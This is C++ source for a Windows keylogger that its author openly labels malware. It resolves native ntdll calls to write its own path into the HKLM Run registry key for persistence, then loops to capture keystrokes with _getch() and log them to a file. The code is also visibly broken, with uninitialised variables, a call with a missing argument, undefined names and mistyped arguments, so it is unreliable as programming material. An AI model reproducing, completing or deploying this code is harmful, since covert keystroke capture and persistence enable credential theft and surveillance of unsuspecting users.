#include <cstddef>
#include <stdio.h>
#include <windows.h>
#include <conio.h>
#include <winternl.h>
#include "lowkey.h"

// lowks keylogger
// unfunny malware
// heart heart heart

// by peroxidee

#define k(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define w(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

HMODULE getMod(LPCWSTR modName) {
    HMODULE hModule = NULL;
    i("trying to get a handle to %S", modName);

    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        w("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        k("got a handle to the module!");
        i("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }
}




int main(void) {

    NTSTATUS status = NULL;
    PVOID rBuffer = NULL;
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    HMODULE hNTDLL = NULL;


    hNTDLL = GetModuleHandleA("ntdll.dll");
    const NtCreateFile _NtCreateFile = (NtCreateFile)GetProcAddress(hNTDLL, "NtCreateFile");
    const NtWriteFile _NtWriteFile = (NtWriteFile)GetProcAddress(hNTDLL,
        "NtWriteFile");
    const NtOpenKey _NtOpenKey = (NtOpenKey)GetProcAddress(hNTDLL,
     "NtOpenKey");
    const NtCreateKey _NtCreateKey = (NtCreateKey)GetProcAddress(hNTDLL,
      "NtCreateKey");

    char path[MAX_PATH];
    DWORD result;

    UNICODE_STRING registryPath;


    HANDLE hw;
    POBJECT_ATTRIBUTES wl;
    ACCESS_MASK am;


    RtlInitUnicodeString(&registryPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

 wl = {
        .Length = sizeof(OBJECT_ATTRIBUTES),
        .RootDirectory = NULL, // No root directory is used, so this is NULL
        .ObjectName = &registryPath, // Points to the UNICODE_STRING containing the registry path
        .Attributes = OBJ_CASE_INSENSITIVE, // Example attribute, can be adjusted as needed
        .SecurityDescriptor = NULL, // No security descriptor
        .SecurityQualityOfService = NULL // No quality of service
    };


    status = _NtOpenKey(&hw, am, wl);

     if (status != STATUS_SUCCESS) {
                w("err: 0x%x", status);
            }


    RtlInitUnicodeString(&result,GetModuleFileName(NULL, path, MAX_PATH));


        wl = {
            .Length = sizeof(OBJECT_ATTRIBUTES),
            .RootDirectory = NULL, // No root directory is used, so this is NULL
            .ObjectName = &result, // Points to the UNICODE_STRING containing the registry path
            .Attributes = OBJ_CASE_INSENSITIVE, // Example attribute, can be adjusted as needed
            .SecurityDescriptor = NULL, // No security descriptor
            .SecurityQualityOfService = NULL // No quality of service
        };

    _NtCreateKey(&hw,am, wl, NULL, );
     if (status != STATUS_SUCCESS) {
                w("err: 0x%x", status);
            }


    HFILE hf;
    IO_STATUS_BLOCK ys;

    ULONG ly = FILE_ATTRIBUTE_NORMAL;
    ULONG cc= FILE_SHARE_READ;
    ULONG qq = FILE_OVERWRITE_IF;
    ULONG co = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT;
    PVOID eb = NULL;
    ULONG el = 0;
  status =  _NtCreateFile(&hf,am, wl, &ys,  ly,0x00000000,cc,qq,co, eb,el );

   if (status != STATUS_SUCCESS) {
                w("err: 0x%x", status);
            }
    int cnt;
    int ch;
    LARGE_INTEGER byteOffset;
    byteOffset.QuadPart = 0;

    while (1 == 1) {
        cnt++;
        ch = _getch();
        char* t = ascii_lookup[ch]; 
        size_t tl = strlen(text);

        if(ascii_lookup[ch] == '\r' ) {
            const char newline[] = "\r\n";  // Newline in ASCII/UTF-8
            size_t newline_length = sizeof(newline) - 1; 
          
              status = _NtWriteFile(
                &hf,
                NULL,
                NULL,
                NULL,
                &ys,
                &newline,
                (ULONG)newline_length,
                &byteOffset,
                NULL
            );
             if (status != STATUS_SUCCESS) {
                w("err: 0x%x", status);
            }

            _NtWriteFile(ascii_lookup[ch]);
        }
        else {
              status = _NtWriteFile(
                &hf,
                NULL,
                NULL,
                NULL,
                &ys,
                &t,
                (ULONG)tl,
                &byteOffset,
                NULL
            );
            if (status != STATUS_SUCCESS) {
                w("err: 0x%x", status);
            }
        }
        
    }



    return 0;
}



